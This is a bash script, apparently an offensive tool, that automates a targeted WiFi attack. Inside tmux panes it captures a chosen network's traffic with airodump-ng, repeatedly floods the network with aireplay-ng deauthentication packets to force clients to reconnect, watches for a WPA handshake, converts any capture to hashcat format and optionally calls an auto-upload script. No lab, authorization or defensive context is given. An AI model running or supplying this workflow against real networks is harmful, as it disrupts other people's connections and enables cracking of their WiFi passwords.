#!/bin/bash
# workflow_attack.sh - Targeted attack workflow

BSSID=$1
CHANNEL=$2
ESSID=${3:-"target"}
DURATION=${4:-1800}  # 30 minutes default

usage() {
    echo "Usage: $0 <bssid> <channel> [essid] [duration]"
    echo "Example: $0 AA:BB:CC:DD:EE:FF 6 HomeWiFi 1800"
    exit 1
}

if [ "$#" -lt 2 ]; then
    usage
fi

SESSION="attack_${ESSID}"

echo "[*] Starting targeted attack workflow"
echo "[*] Target: $ESSID ($BSSID) on channel $CHANNEL"
echo "[*] Duration: ${DURATION}s"

# Create tmux session
tmux new-session -d -s "$SESSION" -n "Capture"

# Pane 0: Handshake capture
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
CAPTURE_FILE=~/captures/wpa/${ESSID}_${BSSID//:/_}_${TIMESTAMP}

tmux send-keys -t "$SESSION:0.0" "\
sudo airodump-ng -c $CHANNEL --bssid $BSSID \
-w $CAPTURE_FILE \
--output-format pcap,csv \
wlan1mon" C-m

# Split and create pane 1: Deauth attack (repeated)
tmux split-window -v -t "$SESSION:0"
tmux send-keys -t "$SESSION:0.1" "\
sleep 10 && \
while true; do \
  echo '[*] Sending deauth packets...'; \
  sudo aireplay-ng --deauth 10 -a $BSSID wlan1mon; \
  sleep 30; \
done" C-m

# New window: Monitor
tmux new-window -t "$SESSION:1" -n "Monitor"
tmux send-keys -t "$SESSION:1" "\
watch -n 2 'aircrack-ng $CAPTURE_FILE-01.cap 2>&1 | grep -A 5 \"handshake\"'" C-m

# Schedule auto-stop
cat > /tmp/attack_stop_${SESSION}.sh <<EOF
#!/bin/bash
sleep $DURATION
tmux send-keys -t "$SESSION:0.0" C-c
tmux send-keys -t "$SESSION:0.1" C-c
echo "[*] Attack duration reached, stopping..."

# Check for handshake
if aircrack-ng "$CAPTURE_FILE-01.cap" 2>&1 | grep -q "1 handshake"; then
    echo "[+] HANDSHAKE CAPTURED!"
    hcxpcapngtool -o "$CAPTURE_FILE.hc22000" "$CAPTURE_FILE-01.cap"
    echo "[*] Converted for hashcat: $CAPTURE_FILE.hc22000"
    
    # Auto-upload if configured
    if [ -f ~/scripts/auto_upload.sh ]; then
        ~/scripts/auto_upload.sh
    fi
fi
EOF

chmod +x /tmp/attack_stop_${SESSION}.sh
/tmp/attack_stop_${SESSION}.sh &

echo "[*] Attack session started: $SESSION"
echo "[*] Will automatically stop after $(($DURATION/60)) minutes"
echo "[*] Attach with: tmux attach -t $SESSION"
echo "[*] Or run headless - check captures later"

# Optionally attach
read -p "Attach to session now? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    tmux attach -t "$SESSION"
fi